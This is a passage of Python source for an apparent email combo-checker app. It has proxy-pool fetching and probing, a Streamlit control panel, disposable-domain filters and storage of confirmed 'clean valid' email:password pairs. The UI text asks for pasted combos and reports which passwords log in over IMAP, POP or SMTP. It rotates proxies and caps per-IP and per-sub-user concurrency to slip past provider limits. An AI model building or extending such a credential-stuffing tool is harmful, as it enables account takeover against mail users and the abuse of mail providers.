        strict = bool(live_cfg().get("PROBE_STRICT", PROBE_STRICT_DEFAULT))
        note = ""
        if not live and not strict:
            live = raw
            note = " | STRICT OFF: fell back to the raw pool"
        elif not live and batch_timed_out:
            note = f" | probe batch budget ({budget:.0f}s) spent"

        if not live and STATE.get("run_active"):
            with alive_pool_lock:
                still = [p for p in alive_pool if p]
            if still:
                note += f" | kept the current {len(still)}-node pool (run in flight)"
                log_probe_event(f"refresh kept pool ({len(still)} nodes) - 0 passed under load")
                try:
                    mail_dest_spot_check()
                except Exception as _mse:
                    log_probe_event(f"mail-dest spot check failed: {_mse}")
                return

        with alive_pool_lock:
            alive_pool[:] = live
        enrich_proxy_geo(live)
        save_proxy_meta()
        STATE["last_probe_ts"] = time.time()
        STATE["probe_runs"] = int(STATE.get("probe_runs", 0)) + 1

        try:
            mail_dest_spot_check()
        except Exception as _mse:
            log_probe_event(f"mail-dest spot check failed: {_mse}")

        passed, auth, timeout_n, dead = probe_summary()
        line = (f"Alive pool refreshed: {len(live)} node(s) passed the tunnel probe "
                f"out of {len(raw)} candidate(s). Probe breakdown -> pass={passed} "
                f"auth407={auth} timeout={timeout_n} dead={dead} | "
                f"target={live_cfg().get('PROBE_TARGET')} budget={budget:.0f}s strict={strict}{note}")
        log_startup(line, quiet=True)
        log_probe_event(f"refresh end: alive={len(live)}/{len(raw)} pass={passed} "
                        f"auth={auth} timeout={timeout_n} dead={dead}{note}")
    finally:
        STATE["probe_in_flight"] = False
        STATE["last_probe_ts"] = time.time()
        try:
            _PROBE_OWNER_LOCK.release()
        except Exception:
            pass
# @@END 074 REFRESH_POOL

# @@BLOCK 075 ALIVE_THREAD deps=013,074
def start_alive_refresher():
    if any(t.name == "alive-pool" for t in threading.enumerate()):
        return

    def loop():
        while True:
            try:
                if STATE.get("run_active"):
                    refresh_alive_pool()
                    time.sleep(PROBER_BUSY_SLEEP)
                else:
                    refresh_alive_pool()
                    time.sleep(PROBER_IDLE_SLEEP)
            except Exception:
                time.sleep(PROBER_BUSY_SLEEP)

    threading.Thread(target=loop, daemon=True, name="alive-pool").start()


start_alive_refresher()
# @@END 075 ALIVE_THREAD

# @@BLOCK 076 QUEUE_PROBE_TARGETS deps=011,026,068
def _probe_pair_for(email, domain, flags):
    """The AUTO probe target follows the SELECTED protocols."""
    if flags.get("imap"):
        h = (get_servers(email).get("imap") or [])[:1]
        if h:
            return (h[0], 993)
    if flags.get("pop"):
        h = (get_servers(email).get("pop") or [])[:1]
        if h:
            return (h[0], 995)
    if flags.get("smtp"):
        h = _smtp_hosts_for(domain)
        if h:
            return (h[0], 587)
    if flags.get("sieve"):
        h = (get_servers(email).get("imap") or [])[:1]
        if h:
            return (h[0], SIEVE_PORT)
    return None


def _set_probe_targets_from_queue(accounts, cap=1):
    """Resolve the AUTO probe target from the ACTUAL queue."""
    flags = protocol_flags()
    out, seen_domains, seen_pairs = [], set(), set()
    for raw in accounts or []:
        em = raw.split(":", 1)[0].strip().lower()
        if "@" not in em:
            continue
        dom = em.split("@")[-1]
        if not dom or dom in seen_domains:
            continue
        seen_domains.add(dom)
        try:
            pair = _probe_pair_for(em, dom, flags)
        except Exception:
            pair = None
        if not pair or pair in seen_pairs:
            continue
        seen_pairs.add(pair)
        out.append((pair[0], pair[1], f"auto:{dom}"))
        if len(out) >= cap:
            break
    if out:
        STATE["probe_targets_override"] = out
        log_probe_event(f"probe target AUTO resolved from the queue -> {[o[0] for o in out]}")
    return out
# @@END 076 QUEUE_PROBE_TARGETS

# @@BLOCK 077 FETCH_AND_TEST deps=014,025,058,071,073
def fetch_and_test_all_proxies(silent: bool = False):
    """Fetch every configured provider's lines, validate them, write proxies.txt
    and ARM the live pool.  Returns (alive_count, total_count).
    """
    global all_proxies, filtered_pool

    if requests is None:
        if not silent:
            str_lit.error("Missing 'requests' library.")
        return (0, 0)

    log_startup("Bulk fetch & test of Webshare / Oxylabs proxies started.")
    all_raw = []

    def fetch_ws(key):
        """PAGINATE.  Reading page 1 and stopping loses every later line."""
        proxies = []
        try:
            page = 1
            while page <= 20:
                r = requests.get(
                    "https://proxy.webshare.io/api/v2/proxy/list/",
                    params={"mode": "direct", "page": page, "page_size": 250},
                    headers={"Authorization": f"Token {key}"}, timeout=8)
                if r.status_code != 200:
                    break
                data = r.json() or {}
                results = data.get("results") or []
                for item in results:
                    ip, port = item.get("proxy_address"), item.get("port")
                    user, pwd = item.get("username"), item.get("password")
                    if ip and port:
                        proxies.append(f"{user}:{pwd}@{ip}:{port}" if user and pwd
                                       else f"{ip}:{port}")
                nxt = data.get("next")
                if not nxt or not results or len(results) < 250:
                    break
                page += 1
        except Exception as e:
            warnings.warn(f"Failed fetching Webshare proxy key: {e}")
        return proxies

    try:
        with ThreadPoolExecutor(max_workers=5) as executor:
            for res in executor.map(fetch_ws, WEBSHARE_KEYS):
                all_raw.extend(res)
    except Exception as e:
        warnings.warn(f"ThreadPool Webshare fetch error: {e}")

    all_raw.extend(OXYLABS_PROXIES)
    all_raw = list(dict.fromkeys(all_raw))
    total = len(all_raw)

    if not all_raw:
        log_startup("Fetch & test: no proxy lines returned.")
        if not silent:
            str_lit.warning("No proxies returned. Check WEBSHARE_KEYS in secrets.")
        return (0, 0)

    # The write below replaces proxies.txt with ONLY the survivors, so a
    # provider-wide 407 could shrink your pool with no way back.  proxies_all.txt
    # is the way back - and there is a Restore button.
    try:
        with file_write_lock:
            with open("proxies_all.txt", "w", encoding="utf-8") as _bf:
                _bf.write("\n".join(str(i) for i in all_raw) + ("\n" if all_raw else ""))
        log_startup(f"Backed up the raw fetched pool to proxies_all.txt ({len(all_raw)} line(s)).")
    except Exception as _bex:
        log_startup(f"WARNING: could not write proxies_all.txt: {_bex}")

    clear_tunnel_cache()
    with probe_stats_lock:
        probe_stats.clear()
    clear_proxy_quarantine()

    batch_timeout = max(60.0, min(PROBE_BATCH_BUDGET * 3.0, len(all_raw) * 3.0))
    alive, _ft_timed_out = _run_batch(precheck_proxy_fast, all_raw,
                                      probe_workers(bulk=True), batch_timeout)
    if _ft_timed_out:
        log_startup(f"Fetch & test: batch budget {batch_timeout:.0f}s spent; "
                    f"keeping the {len(alive)} node(s) that finished.")

    alive = list(dict.fromkeys(alive))

    if not alive:
        tcp_ok = []
        _pt = float(CFG.get("PROXY_PRECHECK_TIMEOUT", PROXY_PRECHECK_TIMEOUT_DEFAULT))
        for p in all_raw:
            info = parse_proxy(p)
            if info and is_proxy_alive(info["host"], info["port"], timeout=_pt):
                tcp_ok.append(p)
        alive = tcp_ok or all_raw
        log_startup(f"Fetch & test: 0 nodes passed the tunnel probe; "
                    f"fell back to {len(alive)} TCP-alive line(s).")

    try:
        with file_write_lock:
            with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as f:
                f.write("\n".join(str(i) for i in alive) + ("\n" if alive else ""))
    except Exception as ex:
        str_lit.error(f"Failed to write proxies file: {ex}")

    # ARM THE POOL: no cold re-probe needed at Start
    with alive_pool_lock:
        alive_pool[:] = list(alive)
    try:
        enrich_proxy_geo(alive)
    except Exception:
        pass
    save_proxy_meta()
    STATE["last_probe_ts"] = time.time()
    STATE["probe_runs"] = int(STATE.get("probe_runs", 0)) + 1
    STATE["bootstrap_done"] = True

    try:
        mail_dest_spot_check(force=True)
    except Exception as _mse:
        log_probe_event(f"mail-dest spot check failed: {_mse}")

    all_proxies = load_proxies()
    filtered_pool = get_filtered_active_proxies(quiet=True)

    log_startup(f"Fetch & test complete: {len(alive)}/{total} node(s) validated, "
                f"written and ARMED.")
    return (len(alive), total)
# @@END 077 FETCH_AND_TEST

# @@BLOCK 078 CLEAN_VALID_IO deps=039
CLEAN_VALID_FILE = user_file("clean_valid_accounts.txt")


def _read_clean_valid():
    """email(lower) -> password, for whatever is on disk right now."""
    seen = {}
    try:
        if os.path.exists(CLEAN_VALID_FILE):
            with open(CLEAN_VALID_FILE, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#") or ":" not in line:
                        continue
                    em, rest = line.split(":", 1)
                    em = em.strip().lower()
                    if em and em not in seen:
                        seen[em] = rest.split("|")[0].strip()
    except Exception:
        pass
    return seen


def _write_clean_valid(header, valids):
    """Merge `valids` into clean_valid_accounts.txt and rewrite the file."""
    merged = _read_clean_valid()
    for v in valids or []:
        if ":" not in v:
            continue
        em, rest = v.split(":", 1)
        em = em.strip().lower()
        if not em:
            continue
        merged[em] = rest.split("|")[0].strip()
    try:
        with file_write_lock:
            with open(CLEAN_VALID_FILE, "w", encoding="utf-8") as f:
                f.write(header)
                for em in sorted(merged):
                    f.write(f"{em}:{merged[em]}\n")
    except Exception:
        pass
    return len(merged)
# @@END 078 CLEAN_VALID_IO

# @@BLOCK 079 STARTUP_PANEL_UI deps=034,038
section_title("🖥️", "Startup & Under-The-Hood Display Panel",
              "system boot, config injection, proxy health, engine state transitions")

with str_lit.expander("🔍 View All Startup Entries & What Is Going On In The Hood",
                      expanded=False):
    str_lit.markdown("Real-time activity ledger recording system boot, config injection, "
                     "proxy health checks, and engine state transitions:")
    str_lit.code("\n".join(startup_panel_lines()), language="text")
    col_st1, col_st2 = str_lit.columns(2)
    with col_st1:
        if str_lit.button("🔄 Refresh Startup Screen"):
            str_lit.rerun()
    with col_st2:
        if str_lit.button("🧹 Clear Startup Logs"):
            str_lit.session_state.startup_entries = []
            with _STARTUP_BUFFER_LOCK:
                _STARTUP_BUFFER.clear()
                _STARTUP_SEEN.clear()
            log_startup("Startup logs cleared by user.")
            str_lit.rerun()
# @@END 079 STARTUP_PANEL_UI

# @@BLOCK 080 PROXY_MGMT_UI deps=014,016,024,043,052,058,068,070,073,074,077
with str_lit.sidebar:
    str_lit.markdown("---")
    str_lit.markdown("### 🌐 Proxy Management & Health")

    if (not all_proxies) and WEBSHARE_KEYS and not STATE.get("bootstrap_done"):
        STATE["bootstrap_done"] = True
        with str_lit.spinner("First run - fetching and validating your proxy pool..."):
            try:
                fetch_and_test_all_proxies(silent=True)
            except Exception as _be:
                log_startup(f"WARNING: auto-bootstrap failed: {_be}")
        all_proxies = load_proxies()
        filtered_pool = get_filtered_active_proxies(quiet=True)

    if (STATE.get("last_probe_ts", 0.0) == 0.0 and all_proxies
            and not STATE.get("probe_in_flight")
            and not STATE.get("first_probe_kicked")):
        STATE["first_probe_kicked"] = True
        log_probe_event("first-load probe kicked to a background thread (UI not blocked)")
        threading.Thread(
            target=lambda: refresh_alive_pool(force=True, budget=PROBE_BATCH_BUDGET),
            daemon=True, name="first-probe").start()
        str_lit.caption("⏳ First probe running in the background - the page is already usable.")

    _q_now = quarantine_size()
    _alive_now = len(alive_pool)
    _last_ts = STATE.get("last_probe_ts", 0.0)
    _age = int(time.time() - _last_ts) if _last_ts else -1
    _age_txt = f"{_age}s ago" if _age >= 0 else "never"

    _ips = {parse_proxy(p)["host"] for p in all_proxies if parse_proxy(p)}
    _subs = {_subuser_of(p) for p in all_proxies if _subuser_of(p)}
    str_lit.info(f"Loaded Proxies: **{len(all_proxies)}** lines / **{len(_ips)}** IPs / "
                 f"**{len(_subs)}** sub-users | Filtered: **{len(filtered_pool)}** | "
                 f"Alive: **{_alive_now}**")

    if all_proxies and not filtered_pool:
        str_lit.error("⚠ **Every proxy was filtered out** by Min Proxy Score / pool mode / "
                      "circuit breaker. Lower 'Min Proxy Score' or press ♻️ Lift 407 "
                      "Quarantine. The raw list is NOT used as a silent fallback.")

    if _alive_now and not STATE.get("run_active"):
        str_lit.success(
            f"✅ READY - **{_alive_now}** validated node(s) armed. "
            f"Paste your combos and press 🔥 Start Live Checking Engine. Nothing else to set."
        )
    elif not all_proxies and not WEBSHARE_KEYS:
        str_lit.info("No proxies configured - press 📥 Fetch & Test All Proxies, or run "
                     "fully DIRECT.")

    _p_ok, _p_auth, _p_to, _p_dead = probe_summary()
    str_lit.caption(
        f"Probe ({CFG.get('PROBE_TARGET', PROBE_TARGET_DEFAULT)}, {probe_timeout():.0f}s): "
        f"pass **{_p_ok}** | 407 auth **{_p_auth}** | timeout/reset **{_p_to}** | "
        f"dead **{_p_dead}**  ·  last probe {_age_txt}  ·  runs {STATE.get('probe_runs', 0)}"
        + ("  ·  STRICT OFF" if not CFG.get("PROBE_STRICT", True) else "")
    )
    str_lit.caption(f"Probe targets in use: "
                    f"{', '.join(t[0] + ':' + str(t[1]) for t in probe_targets())}")
    str_lit.caption(f"Protocols dialled: **{' + '.join(active_protocols())}**")

    _ms = STATE.get("mail_spot") or {}
    if _ms.get("n"):
        _ms_age = int(time.time() - _ms.get("ts", 0))
        _ms_txt = (f"Mail-destination spot check ({_ms['host']}:{_ms['port']}): "
                   f"pass **{_ms['ok']}** | 407 **{_ms['auth']}** | other **{_ms['other']}** "
                   f"/ {_ms['n']} node(s), {_ms_age}s ago")
        if _ms.get("auth") and not _ms.get("ok"):
            str_lit.error(
                "🚨 " + _ms_txt + " - the pool passes the WEB probe but the provider is "
                "refusing MAIL destinations with 407. Set **Proxy Mode Engine = off** "
                "(DIRECT) or wait for the 'email servers' cap to reset. Those passwords "
                "are still untested."
            )
        else:
            str_lit.caption(_ms_txt)

    _tr = _probe_target_reachability()
    _tr_txt = "  ".join(f"{r['target']} {'OK' if r['ok'] else 'FAIL'}" for r in _tr)
    str_lit.caption(f"App-host direct reachability: {_tr_txt}")
    str_lit.caption(
        f"Concurrency: host cap **{CFG.get('HOST_CONCURRENCY')}** · per-IP cap "
        f"**{CFG.get('PROXY_IP_CONCURRENCY')}** · per-SUBUSER cap "
        f"**{CFG.get('PROXY_SUBUSER_CONCURRENCY')}** · proxy cap "
        f"**{CFG.get('PROXY_CONCURRENCY')}**"
        f" · rotation **{'RANDOM' if CFG.get('RANDOM_ROTATION') else 'round-robin'}**"
    )
    _rb = request_budget()
    str_lit.caption(
        f"Request budget: ~**{_rb['per_account']}** proxy request(s) per account worst case · "
        f"**{_rb['idle_per_min']:.0f}/min** background probing while idle · "
        f"**{_rb['cycle']}** per full pool cycle"
        + ("" if CFG.get("PROBER_IDLE_ENABLED", PROBER_IDLE_ENABLED_DEFAULT)
           else "  ·  idle probing **OFF** (probes only on load / Start / Re-probe)")
    )
    str_lit.caption(
        f"407 contract: quarantine after **{PROXY_407_QUARANTINE}** strikes · "
        f"force DIRECT after **{PROXY_407_FORCE_DIRECT}** in a rung · "
        f"park **{PROXY_407_COOLDOWN:.0f}s** · "
        f"same-host retries **{CFG.get('SAME_HOST_RETRIES')}** · "
        f"legacy 143/110 leash **{LEGACY_RUNG_TIMEOUT:.0f}s**"
    )
    str_lit.caption(
        f"Verdict guard: WRONG is confirmed across hosts = "
        f"**{CFG.get('CONFIRM_WRONG_ACROSS_HOSTS')}** · "
        f"self-signed = **{CFG.get('ALLOW_SELF_SIGNED')}** "
        f"(strict={CFG.get('TLS_STRICT')})"
    )

    if _q_now:
        str_lit.warning(f"🩹 Quarantined for 407: **{_q_now}** node(s)")
    if not all_proxies:
        str_lit.caption("No proxies configured - the engine will run fully DIRECT until "
                        "you add some.")
    elif _alive_now == 0:
        str_lit.warning("⚠ No node passed the tunnel probe. Press 📥 Fetch & Test All "
                        "Proxies again.")
    else:
        str_lit.caption("A 407 means the PROXY rejected your credentials - usually a "
                        "per-sub-user cap, not a dead node. A socket reset is reported "
                        "separately. A LOGIN_DROPPED (* BYE) is a MAIL-SERVER event, "
                        "not a proxy one.")

    _rc1, _rc2, _rc3 = str_lit.columns(3)
    with _rc1:
        if str_lit.button("🔁 Re-probe pool now", width="stretch"):
            clear_tunnel_cache()
            refresh_alive_pool(force=True, budget=PROBE_BATCH_BUDGET)
            str_lit.success("Pool re-probed.")
            str_lit.rerun()
    with _rc2:
        if str_lit.button("🧾 Show raw proxies.txt", width="stretch"):
            try:
                with open(CFG["PROXY_FILE"], encoding="utf-8", errors="ignore") as _pf:
                    _lines = [l.rstrip() for l in _pf if l.strip()]
                _uniq = list(dict.fromkeys(_lines))
                str_lit.caption(f"{len(_lines)} line(s), {len(_uniq)} unique, "
                                f"{'CREDS present' if any('@' in l for l in _lines) else 'NO CREDS (@ absent)'}")
                str_lit.code("\n".join(_lines[:60]), language="text")
            except Exception as _pf_err:
                str_lit.error(f"Could not read proxies.txt: {_pf_err}")
    with _rc3:
        if str_lit.button("↩️ Restore from proxies_all.txt", width="stretch",
                          help="Fetch & Test writes only the SURVIVORS into proxies.txt. "
                               "This puts the full raw fetched pool back."):
            try:
                if os.path.exists("proxies_all.txt"):
                    with open("proxies_all.txt", encoding="utf-8", errors="ignore") as _rf:
                        _restore = [l.strip() for l in _rf
                                    if l.strip() and not l.strip().startswith("#")]
                    if _restore:
                        with file_write_lock:
                            with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as _wf:
                                _wf.write("\n".join(_restore) + "\n")
                        clear_tunnel_cache()
                        log_startup(f"proxies.txt restored from proxies_all.txt "
                                    f"({len(_restore)} line(s)).")
                        str_lit.success(f"Restored {len(_restore)} line(s) from proxies_all.txt.")
                        str_lit.rerun()
                    else:
                        str_lit.warning("proxies_all.txt is empty.")
                else:
                    str_lit.warning("No proxies_all.txt yet - run Fetch & Test first.")
            except Exception as _rex:
                str_lit.error(f"Restore failed: {_rex}")

    with str_lit.expander("➕ Add Custom Proxies", expanded=False):
        custom_proxy_text = str_lit.text_area(
            "Paste proxies (host:port or user:pass@host:port)",
            placeholder="123.45.67.89:8080", height=100)
        if str_lit.button("Save Custom Proxies"):
            if custom_proxy_text.strip():
                try:
                    new_proxies = [l.strip() for l in custom_proxy_text.splitlines()
                                   if l.strip() and not l.strip().startswith("#")]
                    combined = list(dict.fromkeys(load_proxies() + new_proxies))
                    with file_write_lock:
                        with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as f:
                            f.write("\n".join(combined) + "\n")
                    clear_tunnel_cache()
                    log_startup(f"Added {len(new_proxies)} custom proxies successfully.")
                    str_lit.success(f"Added {len(new_proxies)} custom proxies successfully!")
                    str_lit.rerun()
                except Exception as ex:
                    str_lit.error(f"Error saving custom proxies: {ex}")

    if str_lit.button("📥 Fetch & Test All Proxies"):
        with str_lit.spinner("Fetching from Webshare & Oxylabs and validating every line..."):
            _n_alive, _n_total = fetch_and_test_all_proxies()
        _msr = STATE.get("mail_spot") or {}
        if _n_alive:
            str_lit.success(
                f"✅ READY - **{_n_alive}** working node(s) from **{_n_total}** line(s) "
                f"validated, saved and armed. Press 🔥 Start Live Checking Engine."
            )
            if _msr.get("auth") and not _msr.get("ok"):
                str_lit.error(
                    f"🚨 ...but the MAIL-destination spot check 407'd on "
                    f"{_msr['auth']}/{_msr['n']} sampled node(s) against "
                    f"{_msr['host']}:{_msr['port']}. The provider is capping email-server "
                    f"destinations - set **Proxy Mode Engine = off** until it resets."
                )
        else:
            str_lit.warning("No node passed validation. Check WEBSHARE_KEYS in secrets.")
        str_lit.rerun()

    with str_lit.expander("📊 Proxy Health & Geo Dashboard", expanded=False):
        with probe_stats_lock:
            _pstats = dict(probe_stats)
        if proxy_meta:
            rows = []
            for p_str, meta in proxy_meta.items():
                info = parse_proxy(p_str)
                _ps = _pstats.get(p_str) or {}
                if _ps:
                    _rlabel = _PROBE_REASON_LABEL.get(_ps.get("reason", ""),
                                                      _ps.get("reason", ""))
                    _age2 = f"{int(time.time() - _ps.get('ts', time.time()))}s ago"
                    _last = f"{_rlabel} · {_age2}"
                else:
                    _last = "-"
                rows.append({
                    "Proxy": f"{info['host']}:{info['port']}" if info else "Unknown",
                    "User": (info.get("user") if info else "") or "",
                    "Latency": f"{meta.get('latency_ms', 'N/A')} ms",
                    "Country": meta.get("country", "Unknown"),
                    "Region": meta.get("region", "Unknown"),
                    "Score": meta.get("score", 50),
                    "Fails": meta.get("fails", 0),
                    "Successes": meta.get("success", 0),
                    "407s": _proxy_407.get(p_str, 0),
                    "Parked": "yes" if _proxy_407_parked(p_str) else "",
                    "Attempts": _ps.get("attempts", 0),
                    "Last Probe": _last,
                    "Last Error": (_ps.get("error", "") or "")[:200],
                    "Quarantined": "yes" if proxy_is_quarantined(p_str) else "",
                })
            str_lit.caption(
                f"Probe target {CFG.get('PROBE_TARGET', PROBE_TARGET_DEFAULT)} · "
                f"budget {probe_timeout():.0f}s · strict={CFG.get('PROBE_STRICT', True)} · "
                f"dedupe={CFG.get('DEDUPE_PROXIES', True)} · "
                f"max_targets={CFG.get('PROBE_MAX_TARGETS')} · "
                f"scheme2={CFG.get('PROBE_SECOND_SCHEME')} · "
                f"idle_probe={CFG.get('PROBER_IDLE_ENABLED')} · "
                f"mail_spot={CFG.get('MAIL_SPOT_CHECK')}"
            )
            str_lit.dataframe(pd.DataFrame(rows), width="stretch")
            col_ref1, col_ref2, col_ref3, col_ref4 = str_lit.columns(4)
            with col_ref1:
                if str_lit.button("🔄 Refresh Dashboard"):
                    str_lit.rerun()
            with col_ref2:
                if str_lit.button("🔁 Re-probe All"):
                    clear_tunnel_cache()
                    refresh_alive_pool(force=True, budget=PROBE_BATCH_BUDGET)
                    str_lit.success("Re-probed.")
                    str_lit.rerun()
            with col_ref3:
                if str_lit.button("🧹 Clean Dead / Low-Score"):
                    with proxy_lock:
                        for k, m in list(proxy_meta.items()):
                            if m.get("score", 50) < 5 or m.get("fails", 0) >= 10:
                                proxy_meta.pop(k, None)
                    save_proxy_meta()
                    str_lit.success("Cleaned!")
                    str_lit.rerun()
            with col_ref4:
                if str_lit.button("♻️ Lift 407 Quarantine"):
                    clear_proxy_quarantine()
                    str_lit.success("Quarantine lifted.")
                    str_lit.rerun()
        else:
            str_lit.info("No proxy metadata recorded yet.")
# @@END 080 PROXY_MGMT_UI

# @@BLOCK 081 DIAG_UI deps=014,024,027,030,070,073
with str_lit.expander("🔬 Deep Diagnostics - copy/paste this to debug", expanded=False):
    str_lit.caption(
        "Everything needed to diagnose the pool remotely. Copy the whole block "
        "(hover it, copy icon) and paste it back. It includes raw proxies.txt lines, "
        "so proxy credentials are visible."
    )

    _dc1, _dc2 = str_lit.columns(2)
    with _dc1:
        if str_lit.button("🔁 Rebuild", width="stretch"):
            STATE["diag_cache"] = {"ts": 0.0, "text": ""}
            str_lit.rerun()
    with _dc2:
        if str_lit.button("🧪 Direct self-test", width="stretch"):
            with str_lit.spinner("Running direct self-test..."):
                _probe_target_reachability(force=True)
                _lines = [f"self-test {datetime.now().strftime('%H:%M:%S')}"]
                _lines.extend(_imap_caps_selftest())
                for _raw, _want in (
                    ("command: LOGIN => IMAP server terminating connection", LOGIN_DROPPED),
                    ("* BYE Too many simultaneous connections", RETRY_LATER),
                    ("timed out", CONNECTION_FAILED),
                ):
                    try:
                        _got = st_classify(_raw)
                    except Exception as _ce:
                        _got = f"<{_ce}>"
                    _lines.append(f"  classify {_raw[:46]:48} -> {_got} "
                                  f"{'OK' if _got == _want else 'WANTED ' + _want}")
                for r in _probe_target_reachability(force=True):
                    _lines.append(f"  direct {r['target']}: {'OK' if r['ok'] else 'FAIL'} "
                                  f"{r['ms']}ms resolved={r.get('resolved')} {r['err']}")
                if alive_pool:
                    _one = alive_pool[0]
                    _res = tunnel_probe(_one)
                    _lines.append(f"  tunnel via {_one}: ok={_res['ok']} "
                                  f"reason={_res['reason']} lat={_res['latency_ms']}ms "
                                  f"err={_res.get('error', '')}")
                    _mh, _mp = _mail_spot_target()
                    _mres = tunnel_probe(_one, targets=[(_mh, _mp, "mailspot")],
                                         timeout=MAIL_SPOT_TIMEOUT)
                    _lines.append(f"  MAIL DESTINATION {_mh}:{_mp} via {_one}: "
                                  f"ok={_mres['ok']} reason={_mres['reason']} "
                                  f"err={_mres.get('error', '')}")
                else:
                    _lines.append("  tunnel: no alive node to test")
                STATE["selftest"] = {"ts": time.time(), "text": "\n".join(_lines)}
            STATE["diag_cache"] = {"ts": 0.0, "text": ""}
            str_lit.success("Self-test done.")

    # FIX P1-3: this used to run on EVERY rerun, inside a COLLAPSED expander -
    # and it reads proxies.txt, walks proxy_meta, probes target reachability,
    # resolves the egress geo and calls socket.getfqdn().  Cache it.
    _dcache = STATE.setdefault("diag_cache", {"ts": 0.0, "text": ""})
    if (not _dcache.get("text")) or (time.time() - _dcache.get("ts", 0.0)) > DIAG_CACHE_TTL:
        _dcache = {"ts": time.time(), "text": build_diagnostics_text()}
        STATE["diag_cache"] = _dcache
    _diag = _dcache["text"]

    _st = STATE.get("selftest") or {}
    if _st.get("text"):
        str_lit.markdown("**Last self-test:**")
        str_lit.code(_st["text"], language="text")

    str_lit.download_button(
        "⬇️ Download bundle", data=_diag,
        file_name=f"diag_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
        mime="text/plain", width="stretch",
    )
    str_lit.code(_diag, language="text")
# @@END 081 DIAG_UI

# @@BLOCK 082 PREFILTER_TABLES deps=002,021,043
DISPOSABLE = {
    "tempmail.com", "temp-mail.org", "guerrillamail.com", "guerrillamail.org",
    "10minutemail.com", "10minutemail.net", "mailinator.com", "maildrop.cc",
    "yopmail.com", "yopmail.fr", "trashmail.com", "trashmail.me",
    "getnada.com", "throwawaymail.com", "fakeinbox.com", "sharklasers.com",
    "grr.la", "guerrillamailblock.com", "pokemail.net", "spam4.me",
    "dispostable.com", "mailnesia.com", "tempail.com", "emailondeck.com",
    "mohmal.com", "tempinbox.com", "mailcatch.com", "mailnull.com",
    "spamgourmet.com", "mytemp.email", "tmpmail.org", "tmpmail.net",
    "temp-mail.io", "1secmail.com", "1secmail.org", "1secmail.net",
}
COMMON_TYPOS = {
    "gmai.com", "gamil.com", "gmal.com", "gmial.com", "g-mail.com",
    "outloo.com", "outlok.com", "hotmial.com", "hotmai.com", "hotmali.com",
    "yaho.com", "yahooo.com", "yhoo.com", "iclound.com", "ezweb.ne",
}
STRICT_APP_PROVIDERS = STRICT_APP
ZERO_ACCESS_PROVIDERS = ZERO_ACCESS
EMAIL_REGEX = re.compile(r"^[\w\.-]+@[\w\.-]+\.\w+$")
DISPOSABLE_EXTRA = {"rerttymail.com", "tmpmail.org", "tmpmail.net", "tempmailo.com"}
DISPOSABLE_FILE = "disposable_domains.txt"


def load_disposable_set():
    found = set(DISPOSABLE) | set(DISPOSABLE_EXTRA)
    if os.path.exists(DISPOSABLE_FILE):
        try:
            with open(DISPOSABLE_FILE, encoding="utf-8", errors="ignore") as f:
                found.update(x.strip().lower() for x in f
                             if x.strip() and not x.startswith("#"))
        except Exception:
            pass
    if requests and len(found) < 500:
        try:
            r = requests.get(
                "https://raw.githubusercontent.com/disposable-email-domains/"
                "disposable-email-domains/master/disposable_email_blocklist.conf",
                timeout=8)
            if r.ok and r.text:
                found.update(x.strip().lower() for x in r.text.splitlines()
                             if x.strip() and not x.startswith("#"))
                with open(DISPOSABLE_FILE, "w", encoding="utf-8") as f:
                    f.write("\n".join(sorted(found)))
                log_startup(f"Disposable blocklist loaded: {len(found)}")
        except Exception as e:
            log_startup(f"Disposable list fetch skipped: {e}")
    return found


DISPOSABLE_LIVE = load_disposable_set()


def is_disposable(email):
    try:
        domain = email.split("@")[-1].lower().strip()
        if domain in DISPOSABLE_LIVE or domain in DISPOSABLE_EXTRA:
            return True
        return any(p in domain for p in ("tempmail", "rerttymail", "mailinator",
                                         "yopmail", "guerrilla", "throwaway",
                                         "10minute"))
    except Exception:
        return False
# @@END 082 PREFILTER_TABLES

# @@BLOCK 083 UNFINISHED_IO deps=007,082
def list_unfinished_runs():
    """Every unfinished record on disk, newest first.

    FIX RS-1: this used to call

        glob.glob(path, reverse=True)

    `reverse` is a sorted() keyword, not a glob() one, so the call raised
    TypeError and the bare `except Exception: pass` below swallowed it. This
    function therefore returned [] on EVERY call: the Resume Unfinished counter
    read 0, the inspector said "No items", and the results summary could never
    name a stop reason - while unfinished_live.json sat on disk holding the
    remaining lines. A substring gate cannot catch that, so test_resume_io.py
    now calls the expression.
    """
    runs = []
    _res = user_file("mail_results")
    try:
        os.makedirs(_res, exist_ok=True)
        paths = sorted(glob.glob(os.path.join(_res, "unfinished_*.json")), reverse=True)
    except Exception as e:
        warnings.warn(f"list_unfinished_runs: glob failed ({e})")
        return runs
    for path in paths:
        try:
            with open(path, encoding="utf-8") as f:
                data = json.load(f)
        except Exception:
            continue
        if isinstance(data, dict):
            data["file"] = path
            runs.append(data)
    return runs


def unfinished_remaining_count():
    """How many account LINES are resumable right now - not how many FILES.

    The metric sits in a row of account counts ("Ready to Check", "Disposables"),
    and len(list_unfinished_runs()) counts files. There is only ever one file, so
    a fixed glob alone would print 1 for 25 accounts.
    """
    return len(runstate.remaining())


def save_unfinished(reason, remaining, checked, total):
    """Write the resume record ATOMICALLY.

    runstate.interrupt() re-reads and rewrites unfinished_live.json while the
    loop's checkpoint may be mid-write; a plain truncating write can hand it a
    half file and the reason mirror is then lost.
    """
    _res = user_file("mail_results")
    os.makedirs(_res, exist_ok=True)
    path = os.path.join(_res, "unfinished_live.json")
    tmp = path + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump({"id": "live", "reason": reason, "checked": checked, "total": total,
                   "remaining": remaining,
                   "saved_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}, f)
    os.replace(tmp, path)
    return path


def clear_unfinished():
    path = os.path.join(user_file("mail_results"), "unfinished_live.json")
    if os.path.exists(path):
        try:
            os.remove(path)
        except Exception:
            pass
# @@END 083 UNFINISHED_IO

# @@BLOCK 084 DOMAIN_RESOLVE deps=039,052,058
def check_domain_resolvable(domain, persist=True):
    with cache_lock:
        if domain in domain_cache and "resolvable" in domain_cache[domain]:
            return domain_cache[domain]["resolvable"]
    resolvable = False
    try:
        if dns:
            try:
                if dns.resolver.resolve(domain, "MX"):
                    resolvable = True
            except Exception:
                try:
                    if dns.resolver.resolve(domain, "A"):
                        resolvable = True
                except Exception:
                    pass
        if not resolvable:
            socket.gethostbyname(domain)
